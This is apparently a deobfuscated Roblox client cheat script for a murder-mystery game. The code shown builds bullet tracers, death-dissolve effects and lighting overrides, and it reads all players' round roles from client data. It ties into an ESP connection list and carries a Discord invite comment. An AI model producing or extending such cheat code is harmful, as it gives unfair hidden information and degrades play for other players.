	if typeof(_G.BulletTracerSelfColor) == "Color3" and math.abs(_G.BulletTracerSelfColor.R - 0.70588235294117652) < 0.001 and math.abs(_G.BulletTracerSelfColor.G - 0.23529411764705882) < 0.001 and math.abs(_G.BulletTracerSelfColor.B - 1) < 0.001 then
		_G.BulletTracerSelfColor = Color3.fromRGB(45, 155, 255)
	end

	_G.BulletTracerOtherColor = Color3.fromRGB(255, 70, 70)

	if _G.BulletTracerGlow == nil then
		_G.BulletTracerGlow = true
	end

	local function func92(part10)
		if typeof(part10) == "Vector3" then
			return part10
		end

		if typeof(part10) ~= "Instance" then
			return nil
		end

		if part10:IsA("BasePart") then
			return part10.Position
		end

		if part10:IsA("Attachment") then
			return part10.WorldPosition
		end
		return nil
	end

	local function func93(obj21, num29)
		if typeof(obj21) == "Instance" then
			local model = obj21:FindFirstAncestorWhichIsA("Model")
			local playerFromCharacter = model and Players:GetPlayerFromCharacter(model)
			if playerFromCharacter then
				return playerFromCharacter
			end
		end

		if typeof(num29) ~= "Vector3" then
			return nil
		end
		local n2 = 14
		local value87 = nil

		for _, player in ipairs(Players:GetPlayers()) do
			local character = player.Character
			character = character and character:FindFirstChild("HumanoidRootPart")

			if character then
				local magnitude = (character.Position - num29).Magnitude

				if magnitude < n2 then
					n2 = magnitude
					value87 = player
				end
			end
		end

		return value87
	end

	local function tracerMuzzleOf(player4, num30, num31)
		player4 = player4 and player4.Character
		if not player4 then
			return num30
		end
		local value88 = nil

		for _, child in ipairs(player4:GetChildren()) do
			if child:IsA("Tool") and child:FindFirstChild("Handle") then
				value88 = child
				break
			else
				value88 = nil
			end
		end

		if not value88 then
			return num30
		end

		for _, descendant in ipairs(value88:GetDescendants()) do
			if descendant:IsA("Attachment") then
				local lowered4 = string.lower(descendant.Name)
				if lowered4:find("muzzle") or lowered4:find("barrel") or lowered4:find("fire") or lowered4:find("tip") or lowered4:find("shoot") then
					return descendant.WorldPosition
				end
			end
		end

		local handle = value88:FindFirstChild("Handle")
		if not handle or not handle:IsA("BasePart") then
			return num30
		end
		local n2 = num31 - num30
		if n2.Magnitude < 0.05 then
			return handle.Position
		end
		local unit = n2.Unit
		local cFrame = handle.CFrame
		local n3 = handle.Size * 0.5
		local x = n3.X
		local upVector = cFrame.UpVector
		local y = n3.Y
		local n4 = math.abs(cFrame.RightVector:Dot(unit)) * x + math.abs(upVector:Dot(unit)) * y
		local lookVector = cFrame.LookVector
		local z = n3.Z
		return handle.Position + unit * (n4 + math.abs(lookVector:Dot(unit)) * z)
	end

	_G.__TracerMuzzleOf = tracerMuzzleOf

	local function createPart(color, param56, param57, transparency)
		local part = Instance.new("Part")
		part.Shape = Enum.PartType.Ball
		part.Material = Enum.Material.Neon
		part.Color = color
		part.Anchored = true
		part.CanCollide = false
		part.CanQuery = false
		part.CanTouch = false
		part.CastShadow = false
		part.Size = Vector3.new(param56, param56, param56)
		part.CFrame = CFrame.new(param57)
		part.Transparency = transparency
		part.Parent = folder
		return part
	end

	local function func94(parent, color, brightness, range, num32)
		local pointLight = Instance.new("PointLight")
		pointLight.Color = color
		pointLight.Brightness = brightness
		pointLight.Range = range
		pointLight.Shadows = false
		pointLight.Parent = parent

		pcall(function()
			TweenService:Create(pointLight, TweenInfo.new(num32), { Brightness = 0 }):Play()
		end)

		Debris:AddItem(pointLight, num32 + 0.05)
	end

	local function func95(param58, param59)
		local part11 = createPart(param59, 0.1, param58, 1)
		local particleEmitter = Instance.new("ParticleEmitter")
		particleEmitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
		particleEmitter.Color = ColorSequence.new(Color3.new(1, 1, 1), param59)
		particleEmitter.LightEmission = 1
		particleEmitter.LightInfluence = 0
		local new = NumberSequenceKeypoint.new
		particleEmitter.Size = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.14), new(1, 0) })
		local new2 = NumberSequenceKeypoint.new
		particleEmitter.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.2), new2(1, 1) })
		particleEmitter.Lifetime = NumberRange.new(0.08, 0.22)
		particleEmitter.Speed = NumberRange.new(9, 20)
		particleEmitter.SpreadAngle = Vector2.new(180, 180)
		particleEmitter.Acceleration = Vector3.new(0, -55, 0)
		particleEmitter.Drag = 8
		particleEmitter.Rate = 0
		particleEmitter.Rotation = NumberRange.new(0, 360)
		particleEmitter.Parent = part11
		particleEmitter:Emit(7)
		Debris:AddItem(part11, 0.5)
	end

	local function createAttachment(worldPosition)
		local attachment = Instance.new("Attachment")
		attachment.WorldPosition = worldPosition
		attachment.Parent = workspace.Terrain
		return attachment
	end

	local function createBeam(attachment0, attachment1, flag116, width0, lightEmission)
		local beam = Instance.new("Beam")
		beam.Attachment0 = attachment0
		beam.Attachment1 = attachment1
		beam.Color = typeof(flag116) == "ColorSequence" and flag116 or ColorSequence.new(flag116)
		beam.Width0 = width0
		beam.Width1 = width0
		beam.FaceCamera = true
		beam.LightEmission = lightEmission
		beam.LightInfluence = 0
		beam.Segments = 1
		beam.Transparency = NumberSequence.new(0)
		beam.Parent = workspace.Terrain
		return beam
	end

	local function func96(param60, param61)
		local n2 = math.clamp(param60, 0, 0.98)
		local n3 = math.min(n2 + 0.08, 0.999)
		if n2 <= 0.001 then
			local new = NumberSequenceKeypoint.new
			return NumberSequence.new({ NumberSequenceKeypoint.new(0, param61), new(1, param61) })
		end
		local numberSequence = NumberSequence.new
		local value89 = NumberSequenceKeypoint.new(0, 1)
		local value90 = NumberSequenceKeypoint.new(n2, 1)
		local value91 = NumberSequenceKeypoint.new(n3, param61)
		local new = NumberSequenceKeypoint.new
		local tbl40 = { value89, value90, value91 }

		do
			local values = table.pack(new(1, param61))
			table.move(values, 1, values.n, 4, tbl40)
		end

		return numberSequence(tbl40)
	end

	local function func97(num33, worldPosition, obj22)
		local n2 = math.clamp(tonumber(_G.BulletTracerDuration) or 0.8, 0.15, 4)
		local n3 = math.clamp(tonumber(_G.BulletTracerWidth) or 0.25, 0.03, 1.5)
		local n4 = worldPosition - num33
		local magnitude = n4.Magnitude
		if magnitude < 0.2 then
			return
		end
		local bulletTracerGlow = _G.BulletTracerGlow ~= false
		local color = Color3.new(1, 1, 1)
		local value92 = obj22:Lerp(color, 0.8)
		local value93 = obj22:Lerp(color, 0.35)
		local colorSequence = ColorSequence.new(value93, obj22)
		local attachment4 = createAttachment(num33)
		local attachment5 = createAttachment(num33)
		local attachment6 = createAttachment(num33)
		local list21 = { { beam = createBeam(attachment4, attachment5, value92, n3 * 0.22, 1), alpha = 0, width = n3 * 0.22 } }

		if bulletTracerGlow then
			list21[#list21 + 1] = { beam = createBeam(attachment4, attachment5, colorSequence, n3 * 0.9, 1), alpha = 0.4, width = n3 * 0.9 }
			list21[#list21 + 1] = { beam = createBeam(attachment4, attachment5, colorSequence, n3 * 2.4, 1), alpha = 0.84, width = n3 * 2.4 }
			local beam2 = createBeam(attachment4, attachment5, ColorSequence.new(color, obj22), n3 * 1.6, 1)
			beam2.Texture = "rbxasset://textures/particles/sparkles_main.dds"
			beam2.TextureMode = Enum.TextureMode.Static
			beam2.TextureLength = math.max(n3 * 7, 1)
			beam2.TextureSpeed = 3
			list21[#list21 + 1] = { beam = beam2, alpha = 0.15, width = n3 * 1.6 }
		end

		local beam3 = createBeam(attachment6, attachment5, color, n3 * 0.8, 1)
		beam3.Width0 = n3 * 0.15
		local obj23 = bulletTracerGlow and createBeam(attachment6, attachment5, obj22, n3 * 2.6, 1) or nil

		if obj23 then
			obj23.Width0 = n3 * 0.4
			obj23.Transparency = NumberSequence.new(0.35)
		end

		for _, item38 in ipairs(list21) do
			item38.beam.Transparency = NumberSequence.new(item38.alpha)
		end

		local list22 = {}
		local unit = n4.Unit
		local unit2 = unit:Cross(math.abs(unit.Y) > 0.95 and Vector3.new(1, 0, 0) or Vector3.new(0, 1, 0)).Unit
		local unit3 = unit2:Cross(unit).Unit
		local n5 = n3 * 0.45

		if bulletTracerGlow then
			local n6 = math.clamp(math.floor(magnitude / 0.125), 12, 180)
			local n7 = math.min(magnitude / 1.5, n6 / 12)
			local tbl41 = { offset = 3.1415926535897931, from = color, to = obj22:Lerp(color, 0.45) }
			local tbl42 = { { offset = 0, from = value93, to = obj22 }, tbl41 }

			for _, item39 in ipairs(tbl42) do
				local value94 = nil

				for i = 0, n6 do
					local n8 = i / n6
					local attachment7 = createAttachment(num33 + n4 * n8)

					local tbl43 = {
						a = attachment7,
						along = n8,
						angle = n8 * n7 * 3.1415926535897931 * 2 + item39.offset,
						edge = math.clamp(math.min(n8, 1 - n8) / 0.1, 0, 1),
					}

					if value94 then
						local beam4 = createBeam(value94.a, attachment7, item39.from:Lerp(item39.to, n8), n3 * 0.045, 1)
						beam4.Enabled = false
						tbl43.beam = beam4
					end

					list22[#list22 + 1] = tbl43
					value94 = tbl43
				end
			end
		end

		local function func98(num34, num35, param62, num36)
			for _, item40 in ipairs(list22) do
				local n6 = item40.angle + num35
				local num37 = unit3
				item40.a.WorldPosition = num33 + n4 * item40.along + (unit2 * math.cos(n6) + num37 * math.sin(n6)) * num34

				if item40.beam then
					item40.beam.Enabled = item40.along <= param62
					item40.beam.Transparency = NumberSequence.new(1 - (1 - num36) * item40.edge)
				end
			end
		end

		local n6 = math.clamp(magnitude / 700, 0.035, 0.1)
		local n7 = math.min(magnitude * 0.25, 4)
		local now = os.clock()
		local flag117 = false
		local connection2 = nil

		local function func99()
			if connection2 and connection2.Connected then
				connection2:Disconnect()
			end

			for _, item41 in ipairs(list21) do
				pcall(function()
					item41.beam:Destroy()
				end)
			end

			pcall(function()
				beam3:Destroy()
			end)

			if obj23 then
				pcall(function()
					obj23:Destroy()
				end)
			end

			for _, item42 in ipairs(list22) do
				if item42.beam then
					pcall(function()
						item42.beam:Destroy()
					end)
				end

				pcall(function()
					item42.a:Destroy()
				end)
			end

			for _, item43 in ipairs({ attachment4, attachment5, attachment6 }) do
				pcall(function()
					item43:Destroy()
				end)
			end
		end

		connection2 = RunService.RenderStepped:Connect(function()
			local n8 = os.clock() - now

			if n8 < n6 then
				local n9 = n8 / n6
				attachment5.WorldPosition = num33 + n4 * n9
				attachment6.WorldPosition = num33 + n4 * math.max(0, n9 - n7 / magnitude)

				if #list22 > 0 then
					func98(n5, n8 * 10, n9, 0.1)
				end

				return
			end

			attachment5.WorldPosition = worldPosition

			if not flag117 then
				flag117 = true

				pcall(function()
					beam3:Destroy()
				end)

				if obj23 then
					pcall(function()
						obj23:Destroy()
					end)
				end

				if bulletTracerGlow then
					local n9 = n3 * 2.2
					local part12 = createPart(obj22:Lerp(color, 0.5), n9, worldPosition, 0.35)
					func94(part12, obj22, 2.5, 9, 0.15)

					pcall(function()
						local tbl44 = { Transparency = 1, Size = Vector3.one * n3 * 4 }
						TweenService:Create(part12, TweenInfo.new(0.14), tbl44):Play()
					end)

					Debris:AddItem(part12, 0.3)
					local part13 = createPart(obj22, 0.1, worldPosition, 1)
					local particleEmitter = Instance.new("ParticleEmitter")
					particleEmitter.Texture = "rbxasset://textures/particles/explosion01_shockwave_main.dds"
					particleEmitter.Color = ColorSequence.new(value92, obj22)
					particleEmitter.LightEmission = 1
					particleEmitter.LightInfluence = 0
					local new = NumberSequenceKeypoint.new
					local n10 = n3 * 9
					particleEmitter.Size = NumberSequence.new({ NumberSequenceKeypoint.new(0, n3 * 1.5), new(1, n10) })
					local new2 = NumberSequenceKeypoint.new
					particleEmitter.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.15), new2(1, 1) })
					particleEmitter.Lifetime = NumberRange.new(0.22)
					particleEmitter.Speed = NumberRange.new(0)
					particleEmitter.Rate = 0
					particleEmitter.Parent = part13
					particleEmitter:Emit(1)
					Debris:AddItem(part13, 0.4)
					pcall(func95, worldPosition, obj22)
				end
			end

			local n9 = math.clamp((n8 - n6) / n2, 0, 1)
			local n10 = n9 ^ 0.8
			local n11 = n9 ^ 2

			for _, item44 in ipairs(list21) do
				item44.beam.Transparency = func96(n10, item44.alpha + (1 - item44.alpha) * n11)
				local width1 = item44.width * (1 - 0.6 * n9)
				local beam = item44.beam
				item44.beam.Width0 = width1 * 0.6
				beam.Width1 = width1
			end

			if #list22 > 0 then
				func98(n5 * (1 + 0.8 * (1 - (1 - n9) ^ 3)), n8 * 10, 1, math.min(1, 0.1 + n9 * 1.3))
			end

			if n9 >= 1 then
				func99()
			end
		end)

		task.delay(n6 + n2 + 1, func99)

		if bulletTracerGlow then
			local part14 = createPart(value93, n3 * 2.4, num33, 0.3)
			local part15 = createPart(value92, n3 * 1.2, num33, 0)
			func94(part14, obj22, 3, 10, 0.08)

			pcall(function()
				local tbl45 = { Transparency = 1, Size = Vector3.one * n3 * 4 }
				TweenService:Create(part14, TweenInfo.new(0.09), tbl45):Play()
				TweenService:Create(part15, TweenInfo.new(0.07), { Transparency = 1 }):Play()
			end)

			Debris:AddItem(part14, 0.2)
			Debris:AddItem(part15, 0.2)
		end
	end

	local ok, result = pcall(function()
		return require(ReplicatedStorage:WaitForChild("ClientServices"):WaitForChild("WeaponService"))
	end)

	if ok and result and result.GunFired then
		_G.__BulletTracerConn = result.GunFired.OnClientEvent:Connect(function(param63, param64, param65)
			if not _G.BulletTracerEnabled then
				return
			end
			local flag118 = func92(param64)
			local flag119 = func92(param65)
			if not flag118 or not flag119 then
				return
			end
			local flag120 = func93(param63, flag118)
			if _G.BulletTracerOnlyMine and flag120 ~= localPlayer then
				return
			end
			pcall(func97, tracerMuzzleOf(flag120, flag118, flag119), flag119, flag120 == localPlayer and (_G.BulletTracerSelfColor or Color3.fromRGB(45, 155, 255)) or _G.BulletTracerOtherColor or Color3.fromRGB(255, 70, 70))
		end)

		if type(_G.CoinESPConn) == "table" then
			table.insert(_G.CoinESPConn, _G.__BulletTracerConn)
		end
	else
		warn("Bullet tracer: WeaponService.GunFired unavailable")
	end

	_G.BulletTracerSetEnabled = function(flag121)
		_G.BulletTracerEnabled = flag121 and true or false

		if not _G.BulletTracerEnabled then
			for _, child in ipairs(folder:GetChildren()) do
				pcall(function()
					child:Destroy()
				end)
			end
		end
	end

	_G.BulletTracerSetDuration = function(param66)
		_G.BulletTracerDuration = math.clamp(tonumber(param66) or 0.8, 0.15, 4)
	end

	_G.DrawBulletTracer = function(param67, param68, flag122)
		if not _G.BulletTracerEnabled then
			return
		end

		if typeof(param67) ~= "Vector3" or typeof(param68) ~= "Vector3" then
			return
		end
		local bulletTracerSelfColor = flag122 ~= false and (_G.BulletTracerSelfColor or Color3.fromRGB(45, 155, 255)) or _G.BulletTracerOtherColor or Color3.fromRGB(255, 70, 70)
		local value95

		if flag122 ~= false then
			value95 = tracerMuzzleOf(localPlayer, param67, param68)
		else
			value95 = param67
		end

		pcall(func97, value95, param68, bulletTracerSelfColor)
	end
end

_G.BulletTracerSetOnlyMine = function(flag123)
	_G.BulletTracerOnlyMine = flag123 and true or false
end

_G.BulletTracerSetWidth = function(param69)
	_G.BulletTracerWidth = math.clamp(tonumber(param69) or 0.25, 0.03, 1.5)
end

_G.BulletTracerSetSelfColor = function(bulletTracerSelfColor)
	if typeof(bulletTracerSelfColor) == "Color3" then
		_G.BulletTracerSelfColor = bulletTracerSelfColor
	end
end

_G.BulletTracerSetOtherColor = function(bulletTracerOtherColor)
	if typeof(bulletTracerOtherColor) == "Color3" then
		_G.BulletTracerOtherColor = bulletTracerOtherColor
	end
end

_G.BulletTracerSetGlow = function(flag124)
	_G.BulletTracerGlow = flag124 and true or false
end

_G.DeathDissolveEnabled = true

if _G.__KillFxConns then
	for _, killFxConn in ipairs(_G.__KillFxConns) do
		pcall(function()
			killFxConn:Disconnect()
		end)
	end
end

do
	local killFxConns = {}
	_G.__KillFxConns = killFxConns
	local Debris = game:GetService("Debris")
	local color = Color3.new(1, 1, 1)

	local function func100(param70)
		local roleColors = _G.__RoleColors
		return roleColors and roleColors[param70] or color
	end

	local tbl46 = {
		spark = "rbxasset://textures/particles/fire_sparks_main.dds",
		ember = "rbxasset://textures/particles/sparkles_main.dds",
		glow = "rbxasset://textures/particles/forcefield_glow_main.dds",
		ring = "rbxasset://textures/particles/explosion01_shockwave_main.dds",
	}

	local function func101(param71, param72)
		local new = NumberSequenceKeypoint.new
		return NumberSequence.new({ NumberSequenceKeypoint.new(0, param71), new(1, param72) })
	end

	local function createParticleEmitter(parent, list23, param73)
		local particleEmitter = Instance.new("ParticleEmitter")
		particleEmitter.LightEmission = 1
		particleEmitter.LightInfluence = 0
		particleEmitter.Rate = 0

		for k, value96 in pairs(list23) do
			particleEmitter[k] = value96
		end

		particleEmitter.Parent = parent

		if param73 then
			particleEmitter:Emit(param73)
		end

		return particleEmitter
	end

	local function createPart(parent, cFrame, size)
		local part = Instance.new("Part")
		part.Anchored = true
		part.CanCollide = false
		part.CanQuery = false
		part.CanTouch = false
		part.Transparency = 1
		part.Size = size or Vector3.new(0.2, 0.2, 0.2)
		part.CFrame = cFrame
		part.Parent = parent
		return part
	end

	local function playDeathDissolve(instance17, color2)
		local list24 = {}
		local huge = math.huge
		local n2 = -math.huge

		for _, descendant in ipairs(instance17:GetDescendants()) do
			if descendant:IsA("BasePart") and descendant.Name ~= "HumanoidRootPart" and descendant.Transparency < 0.9 then
				list24[#list24 + 1] = descendant
				huge = math.min(huge, descendant.Position.Y)
				n2 = math.max(n2, descendant.Position.Y)
			elseif descendant:IsA("Decal") then
				descendant.LocalTransparencyModifier = 1
			end
		end

		if #list24 == 0 then
			return
		end
		local humanoidRootPart = instance17:FindFirstChild("HumanoidRootPart")
		humanoidRootPart = humanoidRootPart and humanoidRootPart.Position or list24[1].Position
		local vector = Vector3.new(humanoidRootPart.X, huge - 0.4, humanoidRootPart.Z)
		local value97 = color2:Lerp(color, 0.75)
		local folder = Instance.new("Folder")
		folder.Name = "MarbegDissolve"
		folder.Parent = workspace
		Debris:AddItem(folder, 3.5)
		local part16 = createPart(folder, CFrame.new(humanoidRootPart))
		local pointLight = Instance.new("PointLight")
		pointLight.Color = color2
		pointLight.Range = 11
		pointLight.Brightness = 3.5
		pointLight.Parent = part16
		TweenService:Create(pointLight, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Brightness = 0 }):Play()

		createParticleEmitter(part16, {
			Texture = tbl46.glow,
			Color = ColorSequence.new(value97, color2),
			Size = func101(1.2, 4.5),
			Transparency = func101(0.4, 1),
			Lifetime = NumberRange.new(0.45),
			Speed = NumberRange.new(0),
		}, 2)

		createParticleEmitter(createPart(folder, CFrame.new(vector)), {
			Texture = tbl46.ring,
			Color = ColorSequence.new(value97, color2),
			Orientation = Enum.ParticleOrientation.VelocityPerpendicular,
			EmissionDirection = Enum.NormalId.Top,
			Speed = NumberRange.new(0.01),
			Size = func101(1, 16),
			Transparency = func101(0.1, 1),
			Lifetime = NumberRange.new(0.6),
		}, 1)

		local part = Instance.new("Part")
		part.Anchored = true
		part.CanCollide = false
		part.CanQuery = false
		part.CanTouch = false
		part.CastShadow = false
		part.Material = Enum.Material.Neon
		part.Color = value97
		part.Transparency = 0.15
		part.Size = Vector3.new(0.35, 0.1, 0.35)
		part.CFrame = CFrame.new(vector)
		part.Parent = folder

		TweenService:Create(part, TweenInfo.new(0.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			Size = Vector3.new(0.12, 30, 0.12),
			CFrame = CFrame.new(vector + Vector3.new(0, 15, 0)),
			Transparency = 1,
			Color = color2,
		}):Play()

		local n3 = math.max(n2 - huge, 0.5)
		local tweenInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		local shellCopy = _G.__ShellCopy

		for _, item45 in ipairs(list24) do
			item45.LocalTransparencyModifier = 1
			local value98 = shellCopy and shellCopy(item45, 1.03)

			if value98 then
				value98.Color = value97
				value98.Transparency = 0
				value98.CFrame = item45.CFrame
				value98.Parent = folder
			end

			local cFrame = item45.CFrame
			local size = item45.Size

			task.delay(0.05 + (item45.Position.Y - huge) / n3 * 0.5, function()
				if not folder.Parent then
					return
				end

				if value98 then
					TweenService:Create(value98, tweenInfo, { Color = color2, Transparency = 1, Size = value98.Size * 0.55 }):Play()
				end

				local part17 = createPart(folder, cFrame, size)

				createParticleEmitter(part17, {
					Texture = tbl46.spark,
					Color = ColorSequence.new(value97, color2),
					Size = func101(0.3, 0),
					Transparency = func101(0, 1),
					Lifetime = NumberRange.new(0.35, 0.7),
					Speed = NumberRange.new(5, 11),
					SpreadAngle = Vector2.new(180, 180),
					Drag = 4,
					Acceleration = Vector3.new(0, -6, 0),
					Shape = Enum.ParticleEmitterShape.Box,
					ShapeStyle = Enum.ParticleEmitterShapeStyle.Volume,
				}, 10)

				createParticleEmitter(part17, {
					Texture = tbl46.ember,
					Color = ColorSequence.new(color2:Lerp(color, 0.4), color2),
					Size = func101(0.55, 0),
					Transparency = func101(0.15, 1),
					Lifetime = NumberRange.new(1, 2),
					Speed = NumberRange.new(0.5, 2.5),
					SpreadAngle = Vector2.new(180, 180),
					Drag = 1.5,
					Acceleration = Vector3.new(0, 6, 0),
					RotSpeed = NumberRange.new(-90, 90),
					Shape = Enum.ParticleEmitterShape.Box,
					ShapeStyle = Enum.ParticleEmitterShapeStyle.Volume,
				}, 5)
			end)
		end
	end

	_G.__PlayDeathDissolve = playDeathDissolve
	local byName = {}
	local role = nil
	local n2 = 0

	local function func102()
		local playerData = CurrentRoundClient.PlayerData
		if type(playerData) ~= "table" then
			return
		end
		local flag125 = false

		for k, value99 in pairs(playerData) do
			if type(value99) == "table" and value99.Role and value99.Role ~= "Lobby" then
				if not value99.Dead then
					byName[k] = value99.Role
				end

				local flag126 = k == localPlayer.Name and not value99.Dead
				flag125 = true

				if flag126 then
					role = value99.Role
				end
			end
		end

		if not flag125 and not _G.__RealInRound then
			role = nil
		end
	end

	table.insert(killFxConns, CurrentRoundClient.PlayerDataChanged.Event:Connect(function()
		pcall(func102)
	end))

	local n3 = 0

	table.insert(killFxConns, RunService.Heartbeat:Connect(function()
		local now = os.clock()
		if now - n3 < 0.25 then
			return
		end
		n3 = now
		pcall(func102)
	end))

	local list25 = {}

	table.insert(killFxConns, workspace.DescendantAdded:Connect(function(descendant)
		if descendant.Name == "Raggy" and descendant:IsA("Model") then
			list25[#list25 + 1] = { model = descendant, at = os.clock() }
			-- SL // discord.gg/x7YbZeezpm

			if #list25 > 20 then
				table.remove(list25, 1)
			end
		end
	end))

	local function func103(num38, num39)
		local n4 = 10
		local model = nil

		for _, item46 in ipairs(list25) do
			if item46.at >= num39 - 0.5 and item46.model.Parent then
				local ok, result = pcall(function()
					return item46.model:GetPivot().Position
				end)

				local magnitude = ok and (result - num38).Magnitude

				if magnitude and magnitude < n4 then
					model = item46.model
					n4 = magnitude
				end
			end
		end

		return model
	end

	local function func104(flag127, instance18)
		if flag127 == localPlayer then
			return
		end
		local entry12 = byName[flag127.Name]
		if not role or not entry12 then
			return
		end

		if not (role == "Murderer" or (role == "Sheriff" or role == "Hero") and (entry12 == "Murderer" or os.clock() - n2 < 1)) and not _G.__DissolveAllDeaths then
			return
		end
		local humanoidRootPart = instance18:FindFirstChild("HumanoidRootPart")
		local position = humanoidRootPart and humanoidRootPart.Position
		local func105 = pairs
		local myKillListeners = _G.__MyKillListeners or {}

		for _, myKillListener in func105(myKillListeners) do
			pcall(myKillListener, { name = flag127.Name, role = entry12, position = position, character = instance18 })
		end

		if not _G.DeathDissolveEnabled then
			return
		end
		local now = os.clock()
		local value100 = func100(entry12)

		task.spawn(function()
			local obj24

			while true do
				if position and os.clock() - now < 0.4 then
					obj24 = func103(position, now)
					if not obj24 then
						task.wait()
						continue
					end
				end

				break
			end

			_G.__LastDissolveTarget = obj24 and obj24:GetFullName() or "character (no ragdoll found)"
			pcall(playDeathDissolve, obj24 or instance18, value100)
		end)
	end

	local function func106(param74, obj25)
		local humanoid = obj25:FindFirstChildWhichIsA("Humanoid") or obj25:WaitForChild("Humanoid", 10)
		if not humanoid then
			return
		end
		local flag128 = false

		table.insert(killFxConns, humanoid.Died:Connect(function()
			if flag128 then
				return
			end
			flag128 = true
			func104(param74, obj25)
		end))
	end

	local function func107(player)
		if player == localPlayer then
			return
		end

		if player.Character then
			task.spawn(func106, player, player.Character)
		end

		table.insert(killFxConns, player.CharacterAdded:Connect(function(character)
			func106(player, character)
		end))
	end

	for _, player in ipairs(Players:GetPlayers()) do
		func107(player)
	end

	table.insert(killFxConns, Players.PlayerAdded:Connect(func107))

	local ok, result = pcall(function()
		return require(ReplicatedStorage:WaitForChild("ClientServices"):WaitForChild("WeaponService"))
	end)

	if ok and result and result.GunFired then
		table.insert(killFxConns, result.GunFired.OnClientEvent:Connect(function(obj26, part18)
			local position = typeof(part18) == "Vector3" and part18 or typeof(part18) == "Instance" and part18:IsA("BasePart") and part18.Position

			if not position then
				position = typeof(part18) == "Instance" and part18:IsA("Attachment") and part18.WorldPosition
			end

			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local flag129 = typeof(obj26) == "Instance" and character and obj26:IsDescendantOf(character)

			if not flag129 and position and humanoidRootPart then
				flag129 = (humanoidRootPart.Position - position).Magnitude < 14
			end

			if flag129 then
				n2 = os.clock()
			end
		end))
	end

	for _, killFxConn in ipairs(killFxConns) do
		table.insert(_G.CoinESPConn, killFxConn)
	end

	_G.DeathDissolveSetEnabled = function(flag130)
		_G.DeathDissolveEnabled = flag130 and true or false
	end

	_G.DeathDissolvePreview = function()
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return false, "No character"
		end
		local archivable = character.Archivable
		character.Archivable = true
		local clone = character:Clone()
		character.Archivable = archivable
		if not clone then
			return false, "Could not copy your character"
		end

		for _, descendant in ipairs(clone:GetDescendants()) do
			if descendant:IsA("BaseScript") or descendant:IsA("Tool") then
				descendant:Destroy()
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
			end
		end

		local humanoid = clone:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		end

		local n4 = workspace.CurrentCamera.CFrame.LookVector * Vector3.new(1, 0, 1)
		local unit = n4.Magnitude > 0.01 and n4.Unit or Vector3.new(0, 0, -1)
		local n5 = humanoidRootPart.Position + unit * 8
		clone:PivotTo(CFrame.lookAt(n5, n5 - unit))
		clone.Parent = workspace
		Debris:AddItem(clone, 4)
		task.wait(0.35)
		playDeathDissolve(clone, func100("Murderer"))
		return true, "Playing"
	end

	_G.__DeathDissolveState = function()
		return role, byName, n2
	end
end

_G.WorldTime = "Default"
_G.WorldFullbright = false
_G.WorldNoFog = false
_G.WorldSky = "Default"
_G.WorldColor = false
_G.WorldSaturation = 0.15
_G.WorldContrast = 0.1
_G.WorldBrightness = 0
_G.WorldTint = Color3.new(1, 1, 1)
_G.WorldBloom = false
_G.WorldBloomIntensity = 1.2
_G.WorldTimeList = { "Default", "Day", "Sunset", "Night" }
_G.WorldSkyList = { "Default", "Purple Haze", "Blood Moon", "Ocean", "Toxic", "Golden Hour" }

do
	local Lighting = game:GetService("Lighting")

	if _G.WorldVisualsReset then
		pcall(_G.WorldVisualsReset)
	end

	local color = Color3.fromRGB

	local tbl47 = {
		["Purple Haze"] = { Color = color(185, 130, 255), Decay = color(95, 45, 170), Haze = 2, Glare = 0.4 },
		["Blood Moon"] = { Color = color(255, 95, 85), Decay = color(125, 20, 25), Haze = 2.2, Glare = 0.3 },
		Ocean = { Color = color(125, 205, 255), Decay = color(40, 110, 205), Haze = 1.6, Glare = 0.3 },
		Toxic = { Color = color(160, 255, 125), Decay = color(40, 145, 55), Haze = 2, Glare = 0.25 },
		["Golden Hour"] = { Color = color(255, 205, 125), Decay = color(205, 115, 50), Haze = 1.8, Glare = 0.6 },
	}

	local tbl48 = {}

	local function func108(num40, num41)
		if typeof(num40) == "number" and typeof(num41) == "number" then
			return math.abs(num40 - num41) < 0.001
		end

		if typeof(num40) == "Color3" and typeof(num41) == "Color3" then
			return math.abs(num40.R - num41.R) < 0.005 and math.abs(num40.G - num41.G) < 0.005 and math.abs(num40.B - num41.B) < 0.005
		end
		return num40 == num41
	end

	local function func109(obj27, param75, flag131)
		local entry13 = tbl48[obj27]
		local flag132 = entry13 and entry13[param75]

		if flag131 == nil then
			if flag132 then
				flag132.conn:Disconnect()
				entry13[param75] = nil

				pcall(function()
					obj27[param75] = flag132.original
				end)
			end

			return
		end

		if not flag132 then
			local ok, result = pcall(function()
				return obj27[param75]
			end)

			if not ok then
				return
			end
			flag132 = { original = result, value = flag131 }

			flag132.conn = obj27:GetPropertyChangedSignal(param75):Connect(function()
				local entry14 = obj27[param75]

				if not func108(entry14, flag132.value) then
					flag132.original = entry14
					obj27[param75] = flag132.value
				end
			end)

			tbl48[obj27] = entry13 or {}
			tbl48[obj27][param75] = flag132
		end

		flag132.value = flag131

		if not func108(obj27[param75], flag131) then
			pcall(function()
				obj27[param75] = flag131
			end)
		end
	end

	local function func110(param76)
		local entry15 = tbl48[param76]
		if not entry15 then
			return
		end

		for k in pairs(entry15) do
			func109(param76, k, nil)
		end

		tbl48[param76] = nil
	end

	local function func111(param77, name)
		local flag133 = Lighting:FindFirstChild(name)

		if not flag133 then
			local instance = Instance.new(param77)
			instance.Name = name
			instance:SetAttribute("MarbegKeep", true)
			instance.Parent = Lighting
			flag133 = instance
		end

		return flag133
	end

	local function func112(childName)
		local obj28 = Lighting:FindFirstChild(childName)

		if obj28 then
			func110(obj28)
			obj28:Destroy()
		end
	end

	local tbl49 = {
		"ClockTime",
		"Brightness",
		"Ambient",
		"OutdoorAmbient",
		"GlobalShadows",
		"FogEnd",
